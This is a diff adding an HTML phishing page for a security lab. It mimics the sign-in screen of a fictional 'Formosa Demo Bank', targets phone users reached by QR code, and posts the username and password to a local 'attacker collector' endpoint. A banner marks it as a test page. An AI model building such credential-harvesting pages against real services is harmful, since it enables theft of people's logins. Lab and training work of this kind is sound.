@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <!-- Makes the page fit a phone screen (QR victims are on phones) -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Formosa Demo Bank - Sign in</title>
+  <style>
+    body  { font-family: sans-serif; max-width: 360px; margin: 40px auto; }
+    h1    { color: #0b5d3b; font-size: 1.4em; }
+    label { display: block; margin-top: 12px; }
+    input, button { width: 100%; padding: 8px; margin-top: 4px; box-sizing: border-box; }
+    .lab  { font-size: 0.8em; color: #a00; }
+  </style>
+</head>
+<body>
+  <h1>Formosa Demo Bank</h1>
+  <p class="lab">LAB PHISHING PAGE - fake copy of a fictional bank, for testing only.</p>
+
+  
+  <!-- Cross-origin send: the form posts to the attacker collector (port 8002) -->
+  <form action="http://127.0.0.1:8002/collect" method="post">
+
+    <label>Username
+      <input type="text" name="username">
+    </label>
+
+    <label>Password
+      <input type="password" name="password">
+      
+    </label>
+
+    <button type="submit">Sign in</button>
+  </form>
+</body>
+</html>
